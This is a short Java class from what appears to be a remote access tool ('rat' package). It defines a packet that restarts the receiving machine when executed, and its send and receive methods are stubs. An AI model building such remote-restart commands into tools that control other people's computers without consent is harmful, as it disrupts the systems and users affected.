package de.sogomn.rat.packet;

import de.sogomn.rat.ActiveConnection;
import de.sogomn.rat.util.Constants;

public final class RestartPacket implements IPacket {
	
	public RestartPacket() {
		//...
	}
	
	@Override
	public void send(final ActiveConnection connection) {
		//...
	}
	
	@Override
	public void receive(final ActiveConnection connection) {
		//...
	}
	
	@Override
	public void execute(final ActiveConnection connection) {
		Constants.OS_SERVICE.restart();
	}
	
}
